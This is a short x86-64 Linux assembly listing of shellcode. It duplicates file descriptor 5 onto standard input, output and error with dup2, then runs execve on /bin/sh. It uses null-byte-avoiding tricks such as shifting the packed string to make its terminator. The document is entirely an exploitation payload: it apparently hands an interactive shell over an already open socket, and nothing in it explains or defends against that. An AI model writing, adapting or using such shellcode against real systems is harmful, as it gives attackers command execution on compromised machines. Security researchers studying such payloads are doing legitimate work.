global _start
section .text

_start:

; dup2(rdi = 5, rsi = 0)
; dup2(rdi = 5, rsi = 1)
; dup2(rdi = 5, rsi = 2)
    xor rsi, rsi
dup:
    push 0x05
    pop rdi
    push 0x21 ; syscall nr
    pop rax
    syscall
    inc rsi
    cmp rsi, 0x2
    jbe dup


;execve("/bin/sh", 0, 0)
    xor rdi, rdi
    push rdi
    push rdi
    pop rsi
    pop rdx
    mov rdi, 0x68732f6e69622f2f ; hs/nib//
    shr rdi, 0x08 ; shr to obtain \x00
    push rdi ; \x00hs/nib/
    push rsp
    pop rdi
    push 0x3b ; syscall nr
    pop rax
    syscall
